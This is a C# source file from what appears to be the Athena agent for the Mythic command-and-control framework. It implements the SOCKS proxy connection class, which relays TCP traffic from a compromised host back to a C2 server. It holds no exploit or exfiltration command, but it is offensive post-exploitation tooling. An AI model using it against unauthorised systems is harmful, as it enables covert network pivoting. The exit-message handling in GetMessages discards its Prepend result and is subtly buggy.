using Athena.Models.Mythic.Response;
using Athena.Models.Socks;
using System.Collections.Concurrent;
using System.Net;

namespace Athena.Models.Athena.Socks
{
    public class AthenaSocksConnection
    {
        public int server_id { get; set; }
        //public SimpleTcpClient client;
        public AsyncTcpClient client;
        public AutoResetEvent onSocksEvent = new AutoResetEvent(false);
        private ConcurrentBag<SocksMessage> messages = new ConcurrentBag<SocksMessage>();
        private bool exited;

        public AthenaSocksConnection(ConnectionOptions co) {
            this.client = new AsyncTcpClient(co)
            {
                ConnectedCallback = async (client, isReconnected) =>
                {
                    Console.WriteLine($"[{DateTime.Now}][{this.server_id}] Connected!");
                    SocksMessage smOut = new SocksMessage(
                     this.server_id,
                     new ConnectResponse
                     {
                         bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
                         bndport = new byte[] { 0x00, 0x00 },
                         addrtype = (byte)AddressType.IPv4,
                         status = ConnectResponseStatus.Success,
                     }.ToByte(),
                     false
                    );
                    this.messages.Add(smOut);
                    this.onSocksEvent.Set();
                },
                ClosedCallback = async (client, closedByRemote) =>
                {
                    Console.WriteLine($"[{DateTime.Now}][{this.server_id}] Closed callback.");
                    this.onSocksEvent.Set();
                    this.exited = true;
                    if (closedByRemote)
                    {
                        this.messages.Add(new SocksMessage(this.server_id, new byte[] { }, true));
                    }
                },
                ReceivedCallback = async(client, count) =>
                {
                    Console.WriteLine($"[{DateTime.Now}][{this.server_id}] Recieved {count} bytes.");
                    byte[] buf;
                    if(count > 0)
                    {
                        buf = this.client.ByteBuffer.Dequeue(count);
                        this.messages.Add(new SocksMessage(this.server_id, buf, this.client.IsConnected ? false : true));
                    }
                }
            };
            this.server_id = co.server_id;
            this.exited = false;
        }

        //private void OnDisconnected(object? sender, ConnectionEventArgs e)
        //{
        //    Console.WriteLine($"[{this.server_id}] OnDisconnected.");
        //    this.onSocksEvent.Set();
        //    this.exited = true;
        //    //this.messages.Add(new SocksMessage(this.server_id, new byte[] { }, true));
        //}

        //private void OnDataReceived(object? sender, DataReceivedEventArgs e)
        //{
        //    if (!this.client.IsConnected)
        //    {
        //        Console.WriteLine($"[{this.server_id}] Exited.");
        //    }
        //    this.messages.Add(new SocksMessage(this.server_id, e.Data.ToArray(), this.client.IsConnected ? false : true));
        //}

        //private void OnConnected(object? sender, ConnectionEventArgs e)
        //{
        //    SocksMessage smOut = new SocksMessage(
        //     this.server_id,
        //     new ConnectResponse
        //     {
        //         bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
        //         bndport = new byte[] { 0x00, 0x00 },
        //         addrtype = (byte)AddressType.IPv4,
        //         status = ConnectResponseStatus.Success,
        //     }.ToByte(),
        //     this.client.IsConnected ? false : true
        //    );
        //    this.messages.Add(smOut);
        //    this.onSocksEvent.Set();
        //}

        public List<SocksMessage> GetMessages()
        {
            List<SocksMessage> msgs = new List<SocksMessage>(this.messages);
            Console.WriteLine($"[{DateTime.Now}][{this.server_id}] Message Count Pre-Clear: {this.messages.Count()}");
            this.messages.Clear();
            Console.WriteLine($"[{DateTime.Now}][{this.server_id}] Message Count Post-Clear: {this.messages.Count()}");

            if (this.exited)
            {
                msgs.Prepend(new SocksMessage(this.server_id, new byte[] { }, true));
            }

            foreach (var msg in msgs)
            {
                msg.PrepareMessage();
            }
            return msgs;
        }
    }
}
